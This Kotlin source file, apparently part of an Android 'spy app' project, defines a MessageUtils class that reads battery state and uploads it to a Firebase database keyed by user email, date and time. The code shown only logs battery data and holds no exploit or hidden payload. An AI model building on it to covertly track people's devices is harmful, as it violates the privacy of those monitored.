package com.komnacki.androidspyapp

import android.content.Context
import android.util.Log
import com.google.firebase.database.*
import github.nisrulz.easydeviceinfo.base.EasyConfigMod
import java.text.SimpleDateFormat
import java.util.*

class MessageUtils {
    private val BATTERY_DATABASE_TAG = "BATTERY"

    companion object {
        lateinit var userEmail: String
        lateinit var context: Context
        fun getInstance(context: Context, userEmail: String): MessageUtils {
            this.context = context
            this.userEmail = userEmail
            return MessageUtils()
        }
    }

    fun getBaseHeader(): DatabaseReference {
        val easyConfigMode = EasyConfigMod(context)
        val currDate = SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(Date())
        return FirebaseDatabase.getInstance().reference
            .child(userEmail)
            .child(currDate)
            .child(easyConfigMode.formattedTime)
    }

    fun sendBatteryMessage() {
        Log.d("KK: ", "sendBatteryMessage method")
        val batteryState = BatteryState()
        batteryState.getBatteryState(context)

        var transactionHandler = object : Transaction.Handler {
            override fun onComplete(p0: DatabaseError?, p1: Boolean, p2: DataSnapshot?) {
                Log.d("KK: ", "onComplete transaction")

            }

            override fun doTransaction(p0: MutableData): Transaction.Result {
                batteryState.getData(context).forEach { item ->
                    Log.d("KK: ", "for each: " + item.toString())
                    p0.child(item.key).value = item.value
                }

                return Transaction.success(p0)

            }
        }

        getBaseHeader()
            .child(BATTERY_DATABASE_TAG)
            .runTransaction(transactionHandler)
    }
}